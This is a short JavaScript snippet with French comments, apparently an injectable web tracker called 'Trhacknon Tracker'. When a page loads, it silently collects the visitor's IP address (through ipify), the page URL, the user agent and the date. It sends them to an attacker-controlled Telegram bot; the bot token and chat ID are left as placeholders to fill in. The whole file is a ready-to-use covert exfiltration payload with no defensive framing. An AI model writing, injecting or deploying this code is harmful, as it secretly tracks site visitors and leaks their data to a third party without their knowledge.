(function () {
    const botToken = "TON_BOT_TOKEN"; // remplace avec ton token
    const chatId = "TON_CHAT_ID";     // remplace avec ton chat_id

    const msgPrefix = "Trhacknon Tracker Activé:\n";

    const payload = async () => {
        const ip = await fetch("https://api.ipify.org?format=json")
            .then(res => res.json())
            .then(json => json.ip)
            .catch(() => "IP inconnue");

        const fullUrl = window.location.href;
        const userAgent = navigator.userAgent;
        const date = new Date().toLocaleString();

        const msg = `${msgPrefix}Date: ${date}\nURL: ${fullUrl}\nIP: ${ip}\nUA: ${userAgent}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: msg })
        });
    };

    payload();
})();
